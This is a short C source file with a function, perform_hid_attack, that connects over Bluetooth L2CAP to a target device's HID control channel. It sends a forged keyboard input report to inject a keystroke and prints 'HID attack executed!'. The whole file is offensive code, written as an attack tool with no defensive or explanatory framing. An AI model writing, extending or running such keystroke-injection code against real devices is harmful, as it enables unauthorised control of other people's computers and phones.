#include "hid.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/bluetooth.h>
#include <sys/socket.h>

void perform_hid_attack(const bdaddr_t *target_addr) {
    int sock;
    struct sockaddr_l2 addr = { 0 };
    sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }
    addr.l2_family = AF_BLUETOOTH;
    addr.l2_psm = htobs(0x11);
    bacpy(&addr.l2_bdaddr, target_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Failed to connect to target device");
        close(sock);
        return;
    }
    unsigned char hid_report[] = { 0xA1, 0x01, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x00, 0x00 };
    write(sock, hid_report, sizeof(hid_report));
    printf("HID attack executed!\n");
    close(sock);
}
